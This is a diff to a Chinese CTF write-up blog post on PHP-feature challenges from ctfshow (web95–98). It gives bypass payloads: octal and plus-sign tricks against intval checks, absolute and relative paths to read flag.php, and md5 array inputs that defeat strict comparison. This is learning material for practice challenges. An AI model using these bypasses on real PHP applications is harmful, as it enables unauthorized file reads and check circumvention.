@@ -1,3 +1,17 @@
+---
+ layout:  post    # 使用的布局（不需要改）
+ title:  从0开始学web之php特性  # 标题 
+ subtitle:  ctfshow   #副标题
+ date:  2020-11-22  # 时间
+ author:  yanmie    # 作者
+ header-img: img/.jpg ##标签这篇文章标题背景图片
+ catalog: true      # 是否归档
+ tags:        
+   - CTF
+
+---
+
+
 ## web89~数组绕过preg_match
 
 ```php
@@ -252,4 +266,101 @@ if(isset($_GET['num'])){
 
 构造`空格+八进制`
 
-## web96
+```
+?num=  010574
+```
+
+也可以
+
+```
+?num=+010574
+?num=%2b010574
+```
+
+
+
+## web96~绝对路径相对路径
+
+```php
+<?php
+
+highlight_file(__FILE__);
+
+if(isset($_GET['u'])){
+    if($_GET['u']=='flag.php'){
+        die("no no no");
+    }else{
+        highlight_file($_GET['u']);
+    }
+
+
+}
+```
+
+可以看到不能直接等于`flag.php`,
+
+但是我们可以构造路劲让其显示
+
+```php
+?u=/var/www/html/flag.php
+?u=./flag.php
+```
+
+## web97~md5数组绕过
+
+```php
+<?php
+
+include("flag.php");
+highlight_file(__FILE__);
+if (isset($_POST['a']) and isset($_POST['b'])) {
+if ($_POST['a'] != $_POST['b'])
+if (md5($_POST['a']) === md5($_POST['b']))
+echo $flag;
+else
+print 'Wrong.';
+}
+?>
+
+```
+
+这里是强比较。
+
+弱比较的话可以百度有好多md5加密后是0e开头的，弱比较 0=0
+
+**强比较**
+
+如果传入`md5` 函数的不是字符串而是数组，那么就会返回`null`, null=null绕过。
+
+构造
+
+```php
+a[]=1&b[]=2
+```
+
+还有md5强碰撞
+
+https://blog.csdn.net/EC_Carrot/article/details/109525162
+
+https://www.cnblogs.com/kuaile1314/p/11968108.html
+
+## web98
+
+```php
+
+Notice: Undefined index: flag in /var/www/html/index.php on line 15
+
+Notice: Undefined index: flag in /var/www/html/index.php on line 16
+
+Notice: Undefined index: HTTP_FLAG in /var/www/html/index.php on line 17
+<?php
+    
+include("flag.php");
+$_GET?$_GET=&$_POST:'flag';
+$_GET['flag']=='flag'?$_GET=&$_COOKIE:'flag';
+$_GET['flag']=='flag'?$_GET=&$_SERVER:'flag';
+highlight_file($_GET['HTTP_FLAG']=='flag'?$flag:__FILE__);
+
+?>
+```
+
